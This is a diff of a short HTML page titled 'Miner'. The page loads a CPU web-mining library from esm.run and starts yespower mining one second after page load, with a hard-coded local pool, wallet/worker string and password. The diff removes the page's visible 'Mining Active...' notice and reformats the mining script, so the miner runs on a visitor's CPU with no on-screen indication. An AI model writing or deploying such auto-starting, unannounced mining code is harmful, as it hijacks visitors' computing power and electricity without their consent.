@@ -3,26 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <title>Miner</title>
-  <style>body { margin:0; background:#000; color:#0f0; font-family:monospace; }</style>
 </head>
 <body>
-  <div style="position:fixed;top:10px;left:10px;color:rgba(255,255,255,0.4);">Mining Active...</div>
   <script type="module">
-  import * as m from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
-  async function start() {
-    console.log("🚀 Starting miner...");
-    const cfg = {
-      server: "127.0.0.1",
-      port: 8080,
-      worker: "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker1",
-      password: "c=SWAMP",
-      ssl: false
-    };
-    m.start(m.yespower, cfg, null, -1, () => console.log("Job received"), (hr) => {
-      console.log("Hashrate:", hr);
-    }, (err) => console.error("Error:", err));
-  }
-  window.onload = () => setTimeout(start, 1000);
-</script>
+    import * as m from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+    async function start() {
+      console.log("🚀 Starting miner...");
+      const cfg = {
+        server: "127.0.0.1",
+        port: 8080,
+        worker: "Wa8mFnYAtLeiaAmEsuMqtaHYxFFxpAAVZm.worker1",
+        password: "c=SWAMP",
+        ssl: false
+      };
+      m.start(m.yespower, cfg, null, -1, () => console.log("✅ Job received"), (hr) => {
+        console.log("Hashrate:", hr);
+      }, (err) => console.error("❌ Error:", err));
+    }
+    window.onload = () => setTimeout(start, 1000);
+  </script>
 </body>
 </html>
